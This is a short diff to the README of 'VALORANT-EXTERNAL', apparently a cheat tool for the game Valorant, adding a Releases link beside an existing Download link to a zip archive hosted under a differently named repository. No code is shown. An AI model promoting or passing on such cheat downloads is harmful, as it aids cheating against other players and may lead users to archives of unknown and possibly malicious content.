@@ -20,6 +20,7 @@ VALORANT-EXTERNAL was made for educational purposes and personal use. By using o
 </p>
 ## <a id="toc"></a>🌐 〢 Download Latest Version
 </p>
+[Releases](https://github.com/Lunahax/VALORANT-EXTERNAL/releases)
 [Download](https://github.com/ValorantHackDev/Valorant-external-hack/releases/download/1.1/valorant-external.v1.1.zip)
 
 ---
